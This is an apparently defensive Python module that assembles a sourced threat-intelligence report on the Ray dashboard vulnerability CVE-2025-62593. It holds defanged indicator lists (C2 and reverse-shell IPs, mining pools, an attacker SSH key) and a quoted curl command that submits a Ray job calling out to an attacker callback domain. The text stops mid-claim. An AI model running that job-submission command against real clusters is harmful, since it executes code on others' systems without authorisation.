"""Sentinel APEX premium edition v3.0: CVE-2025-62593 (Ray), refreshed 2026-10-01.

Supersedes the 2026-08-17 edition (v1 ``cve-2025-62593-ray-canary`` and its v2
re-presentation). The human review of 2026-10-01
(docs/quality/PREMIUM-REPORT-HUMAN-REVIEW.md) found the earlier edition's
central judgement outdated and its detection rule unable to see the attack it
described. This module is a re-research, not a re-render:

  * every vulnerability-state source was re-retrieved on 2026-10-01 and is
    archived in ``raw-sources/`` (NVD, CISA KEV, FIRST EPSS current + time
    series + three as-of points, Bitsight);
  * new primary sources: the Ray fix commit 70e7c72 and the Ray 2.52.0 source
    (default dashboard bind address, token authentication), Oligo's
    ShadowRay 2.0 research, MITRE ATT&CK campaign C0045 and technique T1189,
    The Hacker News report of the KEV addition;
  * GitHub advisory and CISA BOD 26-04 guidance pages refuse automated
    retrieval (HTTP 403); they are identified by a fingerprint of the exact
    excerpts relied on, as the earlier edition did for the advisory;
  * detection rewritten from the fix itself: Ray 2.52.0 denies POST/PUT
    requests that carry a ``Sec-Fetch-*`` header (browsers always attach
    them), so browser-originated job submissions are the exploit signature,
    whatever the source address.

Nothing here approves anything: ``review=None`` (PREMIUM_READY_PENDING_HUMAN).
Export with ``premium_ray_v3.py``; a named human approves the exact artifact.
"""

from __future__ import annotations

import json
import uuid
from pathlib import Path

from sentinel_engine.reportx.analytic_scaffolding import (
    BibliographyEntry,
    Hypothesis,
    HypothesisSet,
    IntelligenceGap,
)
from sentinel_engine.reportx.claim_model import (
    Claim,
    ClaimType,
    Confidence,
    CorroborationState,
    EpistemicState,
    EvidenceGraph,
    EvidenceRecord,
    ObservedVsContext,
    Reliability,
    SourceRecord,
    SourceRole,
    SourceType,
)
from sentinel_engine.reportx.commercial_readiness import ReportBundle
from sentinel_engine.reportx.detection_validation import DetectionRule, DetectionValidationState
from sentinel_engine.reportx.evidence_integrity import compute_content_sha256, compute_excerpt_fingerprint
from sentinel_engine.reportx.forecast import Forecast
from sentinel_engine.reportx.metrics_registry import ExternalMetric, MetricsRegistry
from sentinel_engine.reportx.product_depth import DepthAssessment
from sentinel_engine.reportx.regulatory import ApplicabilityState, RegulatoryApplicability, not_assessed
from sentinel_engine.reportx.threat_schemas import CVERecord

RAW = Path(__file__).resolve().parent / "raw-sources"
REPORT_ID = "sentinel-apex-vuln-cve-2025-62593-ray-v3"
VERSION = "3.0"
EVIDENCE_CUTOFF = "2026-10-01"
RETRIEVED = "2026-10-01T00:00:00Z"
_RULE_NS = uuid.UUID("6f1c2d4e-0a5b-4c3d-9e8f-7a6b5c4d3e2f")  # stable rule ids (pySigma requires UUIDs)


def _hash(name: str) -> str:
    return compute_content_sha256((RAW / name).read_bytes())


def _epss(name: str) -> dict:
    return json.loads((RAW / name).read_text(encoding="utf-8"))["data"][0]


def _rule_uuid(name: str) -> str:
    return str(uuid.uuid5(_RULE_NS, name))


# ---------------------------------------------------------------------------
# Indicators (defanged, exactly as published by their sources)
# ---------------------------------------------------------------------------

# Bitsight, "RondoDox Botnet: From Zero to 174 Exploited Vulnerabilities"
# (2026-03-11); honeypot observation window 2025-05-25 to 2026-02-16.
RONDODOX_EXPLOIT_IPS = [
    ("45.135.194[.]34", "AS51396 Pfcloud UG"), ("45.135.194[.]11", "AS51396 Pfcloud UG"),
    ("87.121.84[.]31", "AS215925 VPSVAULT.HOST LTD"), ("87.121.84[.]132", "AS215925 VPSVAULT.HOST LTD"),
    ("87.121.84[.]75", "AS215925 VPSVAULT.HOST LTD"), ("45.156.87[.]165", "AS51396 Pfcloud UG"),
    ("192.253.248[.]5", "AS213790 Secure Internet LLC"), ("45.88.186[.]32", "AS210558 1337 Services GmbH"),
    ("45.88.186[.]85", "AS210558 1337 Services GmbH"), ("45.153.34[.]156", "AS51396 Pfcloud UG"),
    ("124.198.131[.]83", "AS210558 1337 Services GmbH"), ("45.135.194[.]32", "AS51396 Pfcloud UG"),
    ("193.26.115[.]195", "AS210558 1337 Services GmbH"), ("192.159.99[.]95", "AS210558 1337 Services GmbH"),
    ("45.94.31[.]201", "AS210558 1337 Services GmbH"), ("193.26.115[.]178", "AS210558 1337 Services GmbH"),
]
RONDODOX_HOSTING_IPS = [
    ("14.103.145[.]202", "AS4811 Beijing Volcano Engine"), ("78.153.149[.]90", "AS207713 Global Internet Solutions"),
    ("154.91.254[.]95", "AS17561 Cloud Innovation"), ("14.103.145[.]211", "AS4811 Beijing Volcano Engine"),
    ("45.8.145[.]203", "AS209847 WorkTitans"), ("37.32.15[.]8", "AS202468 AbrArvan IaaS"),
    ("169.255.72[.]169", "AS327829 SKYTIC TELECOM"), ("38.59.219[.]27", "AS4226 Sumofiber"),
    ("192.183.232[.]142", "AS5650 Frontier Communications"), ("83.252.42[.]112", "AS1257 Tele2 Sverige"),
    ("99.241.94[.]234", "AS812 Rogers Communications"), ("74.194.191[.]52", "AS19108 Optimum"),
    ("70.184.13[.]47", "AS22773 Cox Communications"), ("23.228.188[.]126", "AS16591 Google Fiber"),
    ("41.231.37[.]153", "AS2609 ATI - Agence Tunisienne Internet"), ("45.92.1[.]50", "AS210558 1337 Services GmbH"),
]
RONDODOX_C2_IPS = [
    ("135.148.68[.]54", "AS16276 OVH SAS"), ("83.150.218[.]93", "AS199415 Association YORKHOST"),
    ("45.94.31[.]89", "AS210558 1337 Services GmbH"), ("45.125.66[.]100", "AS133398 Serveroffer"),
]
# Oligo, "ShadowRay 2.0" (2025-11-18): CVE-2023-48022 campaign against
# internet-exposed Ray dashboards (the same Jobs API surface).
SHADOWRAY_IOCS = [
    ("IPv4", "18.228.3[.]224", "ports 48331, 3876", "Primary C2 for reverse shells (AWS, Sao Paulo)"),
    ("IPv4", "18.230.118[.]147", "ports 443, 40331", "Secondary C2; XMRig mining (AWS, Sao Paulo)"),
    ("IPv4", "45.95.168[.]100", "port 8000", "C2 / file server for binaries"),
    ("IPv4", "185.215.180[.]70", "port 8000", "C2 / file server for binaries"),
    ("IPv4", "104.194.151[.]181", "port 443", "Reverse shell"),
    ("IPv4", "121.160.102[.]68", "port 8384", "Reverse shell"),
    ("IPv4", "54.154.170[.]233", "port 30654", "Reverse shell"),
    ("IPv4", "158.160.123[.]117", "port 4444", "Reverse shell"),
    ("IPv4", "193.29.224[.]83", "port 6543", "Reverse shell"),
    ("IPv4", "103.127.134[.]124", "port 30654", "Reverse shell"),
    ("IPv4", "162.248.53[.]119", "port 8000", "Payload server (netsh, myscript.sh)"),
    ("IPv4", "67.217.57[.]240", "port 666", "Malware distribution (netsh)"),
    ("IPv4", "45.61.150[.]83", "port 80", "Malware distribution (xd.sh)"),
    ("Domain", "bwqqvqfgsseplyoltois92rdukv0mm5th.oast[.]fun", "DNS/HTTP", "Out-of-band callback used to find exploitable Ray dashboards"),
    ("Domain", "pool.supportxmr[.]com", "port 443", "Primary Monero mining pool"),
    ("Domain", "gulf.moneroocean[.]stream", "port 20128", "Secondary Monero mining pool"),
    ("Domain", "eu.zano.k1pool[.]com", "port 8866", "ZANO mining pool (xd.sh payload)"),
    ("Account", "gitlab[.]com/ironern440-group", "-", "First-stage payload hosting (blocked by GitLab 2025-11-05)"),
    ("Account", "github[.]com/thisisforwork440-ops", "-", "Second-stage payload hosting (from 2025-11-10)"),
    ("SSH key", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHy6WMgqslpdUCaumLmlUcBjBjuAk4KspADxbcAKrzYd root@archtop", "-",
     "Appended to authorized_keys for persistence"),
]
RONDODOX_USER_AGENT = "Mozilla/5.0 (rondo2012@atomicmail[.]io)"


def build_graph() -> EvidenceGraph:
    g = EvidenceGraph()
    epss_now = _epss("first-epss-cve-2025-62593-20261001.json")
    epss_0818 = _epss("first-epss-cve-2025-62593-asof-2026-08-18.json")
    epss_0824 = _epss("first-epss-cve-2025-62593-asof-2026-08-24.json")
    epss_0925 = _epss("first-epss-cve-2025-62593-asof-2026-09-25.json")

    ghsa_excerpts = [
        "Critical RCE Vulnerability against Ray Devs exploitable via Browser (Safari & Firefox) due to DNS Rebinding Attack",
        "Affected versions < 2.52.0; patched version 2.52.0; published 2025-11-26; CVSS 9.4 (Critical).",
        "the fundamental assumption that the User-Agent header can't be manipulated is incorrect. In Firefox and in "
        "Safari, the fetch API allows the User-Agent header to be set to a different value.",
        "Chrome is not vulnerable, ironically, because of a bug, bringing it out of spec with the fetch specification.",
        "The fix for this vulnerability is to update to Ray 2.52.0 or higher. This version also, finally, adds a "
        "disabled-by-default authentication feature that can further harden against this vulnerability",
        "Ensure that the ray dashboard/service is running on port 8265",
    ]
    g.add_source(SourceRecord(
        source_id="s-ghsa", url="https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v",
        publisher="Ray project (GitHub Security Advisory, CNA)", source_type=SourceType.VENDOR_CNA,
        source_role=SourceRole.PRIMARY_EVENT_SOURCE, retrieved_at=RETRIEVED, source_date="2025-11-26",
        reliability=Reliability.HIGH, independence_group="ray-project-ghsa",
        excerpt_fingerprint_sha256=compute_excerpt_fingerprint(ghsa_excerpts),
        fingerprint_fallback_reason="The advisory page answers automated retrieval with HTTP 403, so its full "
                                     "content could not be archived. It is identified by the SHA-256 of the exact "
                                     "excerpts quoted below.",
    ))
    g.add_source(SourceRecord(
        source_id="s-ray-fix", url="https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09",
        publisher="Ray project (fix commit 70e7c72, 'Add denial of fetch headers')", source_type=SourceType.VENDOR_CNA,
        source_role=SourceRole.VULNERABILITY_SOURCE, retrieved_at=RETRIEVED, source_date="2025-11-14",
        reliability=Reliability.HIGH, independence_group="ray-project-source",
        content_sha256=_hash("ray-commit-70e7c72-fix.patch"),
    ))
    g.add_source(SourceRecord(
        source_id="s-ray-source", url="https://github.com/ray-project/ray/tree/ray-2.52.0/python/ray/_private",
        publisher="Ray project (source, release tag ray-2.52.0)", source_type=SourceType.VENDOR_CNA,
        source_role=SourceRole.VULNERABILITY_SOURCE, retrieved_at=RETRIEVED, source_date="2025-11-26",
        reliability=Reliability.HIGH, independence_group="ray-project-source",
        content_sha256=_hash("ray-2.52.0-ray_constants.py.txt"),
    ))
    g.add_source(SourceRecord(
        source_id="s-ray-auth", url="https://github.com/ray-project/ray/blob/ray-2.52.0/python/ray/_private/authentication/authentication_token_setup.py",
        publisher="Ray project (source, release tag ray-2.52.0)", source_type=SourceType.VENDOR_CNA,
        source_role=SourceRole.VULNERABILITY_SOURCE, retrieved_at=RETRIEVED, source_date="2025-11-26",
        reliability=Reliability.HIGH, independence_group="ray-project-source",
        content_sha256=_hash("ray-2.52.0-authentication_token_setup.py.txt"),
    ))
    g.add_source(SourceRecord(
        source_id="s-nvd", url="https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-62593",
        publisher="NVD (NIST)", source_type=SourceType.NVD, source_role=SourceRole.VULNERABILITY_SOURCE,
        retrieved_at=RETRIEVED, source_date="2026-08-18", reliability=Reliability.HIGH,
        independence_group="nvd-official", content_sha256=_hash("nvd-cve-2025-62593-20261001.json"),
    ))
    g.add_source(SourceRecord(
        source_id="s-cisa-kev", url="https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
        publisher="CISA (KEV catalog version 2026.09.30)", source_type=SourceType.CISA,
        source_role=SourceRole.VULNERABILITY_SOURCE, retrieved_at=RETRIEVED, source_date="2026-09-30",
        reliability=Reliability.HIGH, independence_group="cisa-kev-official",
        content_sha256=_hash("cisa-kev-cve-2025-62593-extraction-20261001.json"),
    ))
    bod_excerpts = [
        "Prioritize immediate acquisition of volatile data",
        "Do not alter or remediate systems prior to evidence/artifact collection when possible.",
        "Maintain an evidence/artifact collection log documenting each item collected, the system it came from, "
        "date/time of collection, and the collector's name.",
        "Collect all required evidence prior to this step as patching may jeopardize the availability of artifacts.",
        "Report the incident to CISA via the CISA Incident Reporting System.",
        "the requirement of BOD 26-04 is that an adequate forensic triage analysis is performed; the specific "
        "timeline below is not required.",
    ]
    g.add_source(SourceRecord(
        source_id="s-cisa-bod", url="https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
        publisher="CISA (BOD 26-04 implementation guidance, updated 2026-08-25)", source_type=SourceType.CISA,
        source_role=SourceRole.METHODOLOGY_SOURCE, retrieved_at=RETRIEVED, source_date="2026-08-25",
        reliability=Reliability.HIGH, independence_group="cisa-bod-guidance",
        excerpt_fingerprint_sha256=compute_excerpt_fingerprint(bod_excerpts),
        fingerprint_fallback_reason="cisa.gov answers automated retrieval of this page with HTTP 403, so its full "
                                     "content could not be archived. It is identified by the SHA-256 of the exact "
                                     "excerpts quoted below.",
    ))
    for sid, fname, date_, label in (
        ("s-epss-now", "first-epss-cve-2025-62593-20261001.json", "2026-10-01", "current score"),
        ("s-epss-series", "first-epss-cve-2025-62593-timeseries-20261001.json", "2026-09-30", "30-day time series"),
        ("s-epss-0818", "first-epss-cve-2025-62593-asof-2026-08-18.json", "2026-08-18", "score as of 2026-08-18"),
        ("s-epss-0824", "first-epss-cve-2025-62593-asof-2026-08-24.json", "2026-08-24", "score as of 2026-08-24"),
        ("s-epss-0925", "first-epss-cve-2025-62593-asof-2026-09-25.json", "2026-09-25", "score as of 2026-09-25"),
    ):
        g.add_source(SourceRecord(
            source_id=sid, url="https://api.first.org/data/v1/epss?cve=CVE-2025-62593"
                               + {"s-epss-now": "", "s-epss-series": "&scope=time-series"}.get(sid, f"&date={date_}"),
            publisher=f"FIRST.org EPSS API ({label})", source_type=SourceType.OTHER,
            source_role=SourceRole.STATISTICAL_SOURCE, retrieved_at=RETRIEVED, source_date=date_,
            reliability=Reliability.HIGH, independence_group="first-epss-official", content_sha256=_hash(fname),
        ))
    g.add_source(SourceRecord(
        source_id="s-bitsight", url="https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis",
        publisher="Bitsight (J. Godinho, 2026-03-11)", source_type=SourceType.CTI_VENDOR_RESEARCH,
        source_role=SourceRole.DETECTION_SOURCE, retrieved_at=RETRIEVED, source_date="2026-03-11",
        reliability=Reliability.MODERATE, independence_group="bitsight-rondodox-research",
        content_sha256=_hash("bitsight-rondodox-20261001.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-oligo", url="https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet",
        publisher="Oligo Security (A. Lumelsky, G. Elbaz, 2025-11-18)", source_type=SourceType.CTI_VENDOR_RESEARCH,
        source_role=SourceRole.DETECTION_SOURCE, retrieved_at=RETRIEVED, source_date="2025-11-18",
        reliability=Reliability.MODERATE, independence_group="oligo-shadowray-research",
        content_sha256=_hash("oligo-shadowray-2-0.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-mitre-c0045", url="https://attack.mitre.org/campaigns/C0045/", publisher="MITRE ATT&CK (campaign C0045, ShadowRay)",
        source_type=SourceType.MITRE, source_role=SourceRole.METHODOLOGY_SOURCE, retrieved_at=RETRIEVED,
        source_date=None, reliability=Reliability.HIGH, independence_group="mitre-attack-official",
        content_sha256=_hash("mitre-attack-c0045-shadowray.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-mitre-t1189", url="https://attack.mitre.org/techniques/T1189/", publisher="MITRE ATT&CK (T1189)",
        source_type=SourceType.MITRE, source_role=SourceRole.METHODOLOGY_SOURCE, retrieved_at=RETRIEVED,
        source_date=None, reliability=Reliability.HIGH, independence_group="mitre-attack-official",
        content_sha256=_hash("mitre-attack-t1189.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-mitre-t1190", url="https://attack.mitre.org/techniques/T1190/", publisher="MITRE ATT&CK (T1190)",
        source_type=SourceType.MITRE, source_role=SourceRole.METHODOLOGY_SOURCE, retrieved_at="2026-08-17T00:00:00Z",
        source_date=None, reliability=Reliability.HIGH, independence_group="mitre-attack-official",
        content_sha256=_hash("mitre-attack-t1190.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-thn", url="https://thehackernews.com/2026/08/cisa-flags-actively-exploited-ray-flaw.html",
        publisher="The Hacker News (R. Lakshmanan, 2026-08-18)", source_type=SourceType.OTHER,
        source_role=SourceRole.CORROBORATION, retrieved_at=RETRIEVED, source_date="2026-08-18",
        reliability=Reliability.MODERATE, independence_group="thn-news", content_sha256=_hash("thehackernews-ray-kev-20260818.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-whatwg-fetch", url="https://fetch.spec.whatwg.org/",
        publisher="WHATWG Fetch Living Standard (last updated 2026-09-21)", source_type=SourceType.OTHER,
        source_role=SourceRole.METHODOLOGY_SOURCE, retrieved_at=RETRIEVED, source_date="2026-09-21",
        reliability=Reliability.HIGH, independence_group="whatwg-fetch",
        content_sha256=_hash("whatwg-fetch-standard-20260921.html"),
    ))
    g.add_source(SourceRecord(
        source_id="s-pytorch", url="https://pytorch.org/blog/pytorch-foundation-welcomes-ray-to-deliver-a-unified-open-source-ai-compute-stack/",
        publisher="PyTorch Foundation (2025-10-22)", source_type=SourceType.OTHER, source_role=SourceRole.STATISTICAL_SOURCE,
        retrieved_at="2026-08-17T00:00:00Z", source_date="2025-10-22", reliability=Reliability.HIGH,
        independence_group="pytorch-foundation-official", content_sha256=_hash("pytorch-foundation-ray.html"),
    ))

    E = lambda eid, sid, text: g.add_evidence(EvidenceRecord(evidence_id=eid, source_id=sid, excerpt=text))  # noqa: E731
    E("e-ghsa-title", "s-ghsa", ghsa_excerpts[0])
    E("e-ghsa-versions", "s-ghsa", ghsa_excerpts[1])
    E("e-ghsa-root", "s-ghsa", ghsa_excerpts[2])
    E("e-ghsa-chrome", "s-ghsa", ghsa_excerpts[3])
    E("e-ghsa-fix", "s-ghsa", ghsa_excerpts[4])
    E("e-ghsa-port", "s-ghsa", ghsa_excerpts[5])
    E("e-fix-secfetch", "s-ray-fix", "def has_sec_fetch_headers(req): checks for any of Sec-Fetch-Mode, Sec-Fetch-Dest, "
      "Sec-Fetch-Site, Sec-Fetch-User; the dashboard now returns 'Browser requests not allowed' (HTTP 405) when "
      "is_browser_request(request) or has_sec_fetch_headers(request), for POST and PUT.")
    E("e-ray-default-bind", "s-ray-source", "DEFAULT_DASHBOARD_IP = \"127.0.0.1\"; DEFAULT_DASHBOARD_PORT = 8265 "
      "(--dashboard-host: 'either localhost (127.0.0.1) or 0.0.0.0 (available from all interfaces). By default, "
      "this is 127.0.0.1').")
    E("e-ray-auth-mode", "s-ray-auth", "Set authentication mode can only be set with the `RAY_AUTH_MODE` environment "
      "variable, not using the system_config.")
    E("e-nvd-cvss31", "s-nvd", "cvssMetricV31 (Primary, nvd@nist.gov): baseScore 8.8, vector "
      "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H.")
    E("e-nvd-cvss40", "s-nvd", "cvssMetricV40 (Secondary, security-advisories@github.com): baseScore 9.4, CRITICAL, "
      "userInteraction PASSIVE.")
    E("e-nvd-cwe", "s-nvd", "weaknesses: CWE-94, CWE-352.")
    E("e-nvd-ssvc", "s-nvd", "ssvcV203 (role CISA Coordinator, timestamp 2026-08-17): exploitation=active, "
      "automatable=yes, technicalImpact=total. lastModified 2026-08-18T04:16:40.860.")
    E("e-nvd-ssvc-prior", "s-nvd", "The NVD record archived 2026-08-17 (lastModified 2026-08-17T18:16:32.503) carried "
      "automatable=no; the 2026-08-18 revision records automatable=yes.")
    E("e-kev-entry", "s-cisa-kev", "cveID CVE-2025-62593; dateAdded 2026-08-17; dueDate 2026-08-20; "
      "knownRansomwareCampaignUse: Unknown; forensicTriage: Yes; requiredAction cites BOD 26-04 and CISA's "
      "Forensics Triage Requirements.")
    for i, ex in enumerate(bod_excerpts):
        E(f"e-bod-{i}", "s-cisa-bod", ex)
    E("e-epss-now", "s-epss-now", f"epss: {epss_now['epss']}, percentile: {epss_now['percentile']}, date: {epss_now['date']}.")
    E("e-epss-0818", "s-epss-0818", f"epss: {epss_0818['epss']}, percentile: {epss_0818['percentile']}, date: {epss_0818['date']}.")
    E("e-epss-0824", "s-epss-0824", f"epss: {epss_0824['epss']}, percentile: {epss_0824['percentile']}, date: {epss_0824['date']}.")
    E("e-epss-0925", "s-epss-0925", f"epss: {epss_0925['epss']}, percentile: {epss_0925['percentile']}, date: {epss_0925['date']}.")
    E("e-epss-series", "s-epss-series", "2026-08-31 to 2026-09-23: 0.16888; 2026-09-24: 0.27290; 2026-09-25 to "
      "2026-09-30: 0.62459.")
    E("e-bitsight-predisclosure", "s-bitsight", "CVE-2025-62593: MITRE Published 2025-11-26, First Observed Date "
      "2025-11-24. This was exploited before the CVE was published ... the PoC for the vulnerability was available "
      "before the published date.")
    E("e-bitsight-flaw", "s-bitsight", "The exploit used by RondoDox specifically sets the User-Agent to "
      "'Mozilla/5.0 (rondo2012@atomicmail[.]io)' which will render the exploit ineffective.")
    E("e-bitsight-infra", "s-bitsight", "Exploitation and hosting infrastructure extracted for May 25, 2025 to "
      "February 16, 2026; exploitation IPs all belong to hosting providers; hosting IPs mostly ISPs; four C2 IPs: "
      "135.148.68[.]54, 83.150.218[.]93, 45.94.31[.]89, 45.125.66[.]100.")
    E("e-oligo-campaign", "s-oligo", "In early November 2025, the Oligo Security research team identified an attack "
      "campaign exploiting the ShadowRay vulnerability (CVE-2023-48022) ... operating under the name IronErn440.")
    E("e-oligo-exposed", "s-oligo", "there are now more than 230,000 Ray servers exposed to the internet")
    E("e-oligo-recon", "s-oligo", "curl -X POST \"http://[host]:[port]/api/jobs/\" -H 'Content-Type: application/json' "
      "-d '{\"entrypoint\": \"curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun\"}'")
    E("e-oligo-creds", "s-oligo", "They discovered and exfiltrated MySQL database credentials from Ray job environment "
      "variables and config files ... many security tokens and cloud credentials present on the compromised machines.")
    E("e-oligo-guidance", "s-oligo", "Ray maintainers issued configuration and deployment guidance, advising that "
      "'Security and isolation must be enforced outside of the Ray Cluster.' ... Add authorization on top of the "
      "Ray Dashboard port (8265 by default).")
    E("e-oligo-iocs", "s-oligo", "Indicators of Compromise table: C2 18.228.3.224 (48331, 3876); 18.230.118.147 "
      "(443, 40331, XMRig); 45.95.168.100 and 185.215.180.70 (8000); reverse shells; pool.supportxmr.com; "
      "gulf.moneroocean.stream; gitlab.com/ironern440-group; GitHub thisisforwork440-ops; SSH key root@archtop.")
    E("e-c0045-t1190", "s-mitre-c0045", "T1190: During ShadowRay, threat actors exploited CVE-2023-48022 on publicly "
      "exposed Ray servers to steal computing power and to expose sensitive data.")
    E("e-c0045-post", "s-mitre-c0045", "T1059.006 Python pty reverse shells; T1105 downloaded and executed the XMRig "
      "miner; T1496.001 GPU compute hijacking for cryptocurrency mining; T1003.008 cat /etc/shadow.")
    E("e-t1189-def", "s-mitre-t1189", "Adversaries may gain access to a system through a user visiting a website over "
      "the normal course of browsing ... Malicious ads are paid for and served through legitimate ad providers "
      "(i.e., Malvertising).")
    E("e-t1190-def", "s-mitre-t1190", "Adversaries may attempt to exploit a weakness in an Internet-facing host or "
      "system to initially access a network.")
    E("e-thn-nodetail", "s-thn", "CISA has not shared any details of how the vulnerability is being exploited in the wild.")
    E("e-thn-private", "s-thn", "the DNS rebinding attack can be used to target Ray instances running inside a private "
      "corporate network.")
    E("e-fetch-forbidden", "s-whatwg-fetch", "forbidden request-header: Host, Origin, Referer and others; if name "
      "when byte-lowercased starts with `proxy-` or `sec-`, then return true. These are forbidden so the user agent "
      "remains in full control over them.")
    E("e-pytorch-adoption", "s-pytorch", "'Ray has already been adopted widely with 237 million downloads to date' "
      "... 'over 39,000 GitHub stars.'")

    C = ClaimType
    S = EpistemicState
    K = Confidence
    O = ObservedVsContext
    SINGLE = CorroborationState.SINGLE_SOURCE
    claims = [
        Claim(claim_id="c-affected", claim_type=C.VULNERABILITY_FACT,
              text="CVE-2025-62593 affects Ray before 2.52.0 and is fixed in 2.52.0.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-ghsa-versions"], source_refs=["s-ghsa", "s-nvd"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-root-cause", claim_type=C.VULNERABILITY_FACT,
              text="Ray's only guard against browser-originated job submissions was a User-Agent prefix check "
                   "('Mozilla'); Firefox and Safari let page scripts change that header through fetch.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-ghsa-root"], source_refs=["s-ghsa"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-chrome", claim_type=C.VULNERABILITY_FACT,
              text="The advisory states Chrome is not vulnerable, because of a Chrome bug that departs from the fetch "
                   "specification.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-ghsa-chrome"], source_refs=["s-ghsa"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-fix-mechanism", claim_type=C.VULNERABILITY_FACT,
              text="The 2.52.0 fix makes the dashboard reject POST and PUT requests that carry any Sec-Fetch-Mode, "
                   "Sec-Fetch-Dest, Sec-Fetch-Site or Sec-Fetch-User header, in addition to the User-Agent check.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-fix-secfetch"], source_refs=["s-ray-fix"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-sec-fetch-forbidden", claim_type=C.VULNERABILITY_FACT,
              text="Under the Fetch standard, Sec-* and Host are forbidden request headers that page scripts cannot "
                   "set; the browser controls them.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-fetch-forbidden"], source_refs=["s-whatwg-fetch"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-default-bind", claim_type=C.VULNERABILITY_FACT,
              text="Ray binds the dashboard to 127.0.0.1:8265 by default; it is reachable from other hosts only "
                   "when started with --dashboard-host 0.0.0.0.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-ray-default-bind", "e-ghsa-port"],
              source_refs=["s-ray-source", "s-ghsa"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-token-auth", claim_type=C.VULNERABILITY_FACT,
              text="Ray 2.52.0 adds token authentication that is disabled by default and enabled only through the "
                   "RAY_AUTH_MODE environment variable.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-ghsa-fix", "e-ray-auth-mode"],
              source_refs=["s-ghsa", "s-ray-auth"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-cvss", claim_type=C.VULNERABILITY_FACT,
              text="The CNA scores the flaw CVSS v4 9.4 (Critical, UI:Passive); NVD's own primary score is CVSS "
                   "v3.1 8.8 (High, UI:Required).",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-nvd-cvss40", "e-nvd-cvss31"],
              source_refs=["s-nvd"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-cwe", claim_type=C.VULNERABILITY_FACT, text="NVD lists CWE-94 and CWE-352.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-nvd-cwe"], source_refs=["s-nvd"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-kev", claim_type=C.VULNERABILITY_FACT,
              text="CISA added the CVE to KEV on 2026-08-17 (due 2026-08-20) and marks it forensicTriage: Yes; "
                   "knownRansomwareCampaignUse is Unknown.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-kev-entry"], source_refs=["s-cisa-kev"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-forensic-triage", claim_type=C.VULNERABILITY_FACT,
              text="CISA's BOD 26-04 guidance tells agencies to collect evidence, volatile data first, before "
                   "patching, keep a collection log, and report confirmed compromise to CISA.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=[f"e-bod-{i}" for i in range(6)],
              source_refs=["s-cisa-bod"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-ssvc", claim_type=C.EXPLOITATION,
              text="CISA's SSVC record shows exploitation=active, automatable=yes and technicalImpact=total; the "
                   "automatable value changed from no to yes in NVD's 2026-08-18 revision.",
              status=S.REPORTED, confidence=K.HIGH, evidence_refs=["e-nvd-ssvc", "e-nvd-ssvc-prior"],
              source_refs=["s-nvd"], observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-no-cisa-detail", claim_type=C.EXPLOITATION,
              text="CISA has not published how the vulnerability is being exploited.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-thn-nodetail"], source_refs=["s-thn"],
              observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-epss-now", claim_type=C.STATISTIC,
              text="EPSS is 0.62459 (99.17th percentile) on 2026-10-01.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-epss-now"], source_refs=["s-epss-now"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-epss-trajectory", claim_type=C.STATISTIC,
              text="EPSS moved from 0.00369 on 2026-08-17 to 0.01015 on 2026-08-18, 0.16888 on 2026-08-24, 0.27290 "
                   "on 2026-09-24 and 0.62459 from 2026-09-25.",
              status=S.CONFIRMED, confidence=K.HIGH,
              evidence_refs=["e-epss-0818", "e-epss-0824", "e-epss-series", "e-epss-0925"],
              source_refs=["s-epss-0818", "s-epss-0824", "s-epss-series", "s-epss-0925"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-rondodox-attempt", claim_type=C.EXPLOITATION,
              text="Bitsight observed RondoDox exploit attempts against this CVE on 2025-11-24, two days before "
                   "publication, because a proof of concept was already public.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-bitsight-predisclosure"],
              source_refs=["s-bitsight", "s-thn"], observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-rondodox-flaw", claim_type=C.TTP_OBSERVED,
